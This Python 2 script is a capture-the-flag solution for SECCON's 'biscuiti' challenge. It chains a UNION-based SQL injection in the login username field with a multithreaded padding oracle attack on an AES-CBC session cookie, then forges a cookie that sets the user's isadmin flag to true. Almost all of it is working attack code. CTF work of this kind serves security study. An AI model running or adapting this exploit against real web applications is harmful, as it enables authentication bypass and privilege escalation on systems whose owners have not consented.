# coding=utf-8
"""
sql injection, padding oracle attack to recover the cipher

padding oracle attack
————————————————————————
http://robertheaton.com/2013/07/29/padding-oracle-attack/
http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html
https://en.wikipedia.org/wiki/Padding_oracle_attack
"""

import time
import base64
import requests
from urllib import unquote
from urllib import quote
# 对tomorrow做了一点修改，可以提前取消线程池中不需要完成的子线程
from tomorrow_change import threads
from tomorrow_change import clear_pools
from tomorrow_change import check_pools_all_done

# 是否使用多线程
USE_MULTI = True
# 子线程临时存储变量
TEMP_CONTAINER_FOR_MULTI_THREADS = -1
# 最大线程数量
MAX_THREADS_NUM = 100
# challenge真实地址
URL_REMOTE = "http://biscuiti.pwn.seccon.jp/"
# 本地测试环境地址
URL_LOCAL = "http://172.17.0.2:8080/"
url = URL_LOCAL
# url = URL_REMOTE


def xor(str_a, str_b):
    """
    两个字符串异或, 以字符串a的长度为准
    """
    return "".join([chr(ord(str_a[i]) ^ ord(str_b[i % len(str_b)])) for i in xrange(len(str_a))])


def pad(text):
    """
    根据PKCS#7, 分组加密算法对最后一个block作填充，如明文刚好被16整除，则填充'\x00'*16
    https://tools.ietf.org/html/rfc2315
    :param text:
    :return:
    """
    return text + chr(16 - len(text)) * (16 - len(text))


def sql_injection(payload_username, payload_enc_password):
    """
    username字段未做过滤，可以利用union语句伪造用户名，密码，从而绕过登陆验证。
    :param payload_username:        sql中的username字段
    :param payload_enc_password:    sql中的enc_password字段
    :return: 返回请求的响应信息
    """
    payload_enc_password = base64.b64encode(payload_enc_password)
    username = "' union select '{username}','{enc_password}".format(username=payload_username,
                                                                    enc_password=payload_enc_password)
    data = {"username": username, "password": ""}
    try:
        r = requests.post(url, data=data)
        return r
    except requests.ConnectionError:
        print "ConnectionError, Redo"
        return sql_injection(payload_username, payload_enc_password)


@threads(MAX_THREADS_NUM)
def sql_injection_multi_thread(i, payload_username, payload_enc_password):
    """
    username字段未做过滤，可以利用union语句伪造用户名，密码，从而绕过登陆验证。
    :param i:                       被遍历的参数
    :param payload_username:        sql中的username字段
    :param payload_enc_password:    sql中的enc_password字段
    :return: 返回请求的响应信息
    """
    global TEMP_CONTAINER_FOR_MULTI_THREADS
    payload_enc_password = base64.b64encode(payload_enc_password)
    username = "' union select '{username}','{enc_password}".format(username=payload_username,
                                                                    enc_password=payload_enc_password)
    data = {"username": username, "password": ""}
    r = requests.post(url, data=data)
    if "Hello" not in r.text:
        TEMP_CONTAINER_FOR_MULTI_THREADS = i


def get_jsession(payload_username):
    """
    获得登陆的jsession
    enc_password和password都置空，使index.php中auth函数的openssl_decrypt解密操作失败，返回False，从而绕过$password==$input
    服务端将session设置在cookie中的jsession字段, 从cookies中获得即可
    :return: jsession: 'a:2:{s:4:"name";s:5:"admin";s:7:"isadmin";N;}\x11\x899A\x99Q\xe0D\xc2\x94\xcc\x1f\rO\x17\''
    """
    r = sql_injection(payload_username=payload_username, payload_enc_password="")
    try:
        jsession = base64.b64decode(unquote(r.cookies["JSESSION"]))
    except KeyError:
        print "KeyError, redo"
        return get_jsession(payload_username)
    return jsession


def padding_oracle_attack(imd, cipher):
    """
    利用enc_password字段构造密文，利用padding oracle attack进行遍历，得到密文/明文/中间值/iv
    如果爆破的那一位正确，则index.php中auth函数的openssl_decrypt解密操作成功，返回True, $password==$input不能满足
    :param cipher:      这一段的密文
    :param imd:         Intermediary Value, 这一段的中间值
    :return: chr(i):    上一段密文的某一位的值
    """
    global TEMP_CONTAINER_FOR_MULTI_THREADS
    iv = chr(0) * 16
    for i in range(256):
        # mid ^ chr(len(imd) + 1)
        last_cipher_know = xor(imd, chr(len(imd) + 1))
        payload_enc_password = iv + 'a' * (15 - len(imd)) + chr(i) + last_cipher_know + cipher
        if USE_MULTI:
            sql_injection_multi_thread(i, payload_username='a' * 26, payload_enc_password=payload_enc_password)
        else:
            r = sql_injection(payload_username='a'*26, payload_enc_password=payload_enc_password)
            if "Hello" not in r.text:
                return chr(i)
            # 会不会出现巧合呢？
            # 例如，目前需要碰撞得到填充字符为5个'\x05'的密文后五位。
            # 而密文倒数第6位恰好是'a'，从而得到6*'\x06'，通过了openssl_decrypt()。
            # 此时得到的倒数第5位密文依然正确吗
            # 但我们认为这是小概率事件，针对同一个秘钥，出现这个情况时，换一个填充字符即可。
            # if "Hello" not in r.text:
            #     payload_enc_password = iv + 'b' * (15 - len(imd)) + chr(i) + last_cipher_know + cipher
            #     r = sql_injection(payload_username='a' * 26, payload_enc_password=payload_enc_password)
            #     if "Hello" not in r.text:
            #         print repr(payload_enc_password)
            #         return chr(i)
            #     else:
            #         print "Found something strange"
            #         return
    while TEMP_CONTAINER_FOR_MULTI_THREADS == -1:
        time.sleep(0.1)
        if check_pools_all_done():
            print "pools all done, but not crack."
            clear_pools()
            return padding_oracle_attack(imd, cipher)
    chr_i = chr(TEMP_CONTAINER_FOR_MULTI_THREADS)
    TEMP_CONTAINER_FOR_MULTI_THREADS = -1
    clear_pools()
    return chr_i


def get_list_of_original_cipher_and_plain(jsession):
    """
    利用padding oracle attack, 得到明文和密文
    :return: list_plain, list_cipher
    """

    # 根据index.php源码, jsession后16位，为aes-128-cbc最后一个block的密文，之前的部分为serialize($SESSION)
    plain_text = jsession[:-16]
    list_plain = []
    for i in range(len(plain_text) / 16):
        list_plain.append(plain_text[i * 16: (i + 1) * 16])
    list_plain.append(pad(plain_text[len(plain_text) / 16 * 16:]))
    list_cipher = [""] * len(list_plain)
    list_cipher[len(list_plain) - 1] = jsession[-16:]

    # padding oracle attack, 以此得到前一个block的密文
    for i in range(len(list_plain) - 1, 0, -1):
        imd = ""
        for j in range(1, 16 + 1):
            print "block {block_number} : the {cipher_index}/16 cipher text".format(block_number=i, cipher_index=j)
            chr_j = padding_oracle_attack(imd, list_cipher[i])
            imd = xor(chr_j, chr(j)) + imd
        # 中间值和明文异或，得到上一个block的密文
        list_cipher[i - 1] = xor(imd, list_plain[i])
    return list_plain, list_cipher


def get_new_cipher_2(list_cipher):
    """
    p2' = c1^c3^p4'
    c2' = encrypt(p2'^c1) = encrypt(c3^p4')=c4'
    :param list_cipher:     original cipher
    :return: new_jsession:  new jsession
    """
    new_plain_2 = xor(xor(list_cipher[1], list_cipher[3]), pad("b:1;}"))
    new_jsession = get_jsession(payload_username='a'*10 + new_plain_2)
    return new_jsession


def main():
    time_start = time.time()

    # get original plain, cipher
    jsession = get_jsession('a'*26)
    list_plain, list_cipher = get_list_of_original_cipher_and_plain(jsession)
    print list_plain
    print list_cipher

    # get new plain, cipher
    new_jsession = get_new_cipher_2(list_cipher)
    new_list_plain, new_list_cipher = get_list_of_original_cipher_and_plain(new_jsession)
    print new_list_plain
    print new_list_cipher

    # Note: 需要用quote进行url编码，否则php中会把‘+’解析成空格
    cookies = {"JSESSION": quote(base64.b64encode("".join(list_plain[:-1]) + "b:1;}" + new_list_cipher[2]))}
    print cookies
    print len(cookies["JSESSION"])
    print repr(base64.b64decode(unquote(cookies["JSESSION"])))
    r = requests.get(url, cookies=cookies)
    print r.content

    time_end = time.time()
    print time_end - time_start


if __name__ == "__main__":
    main()
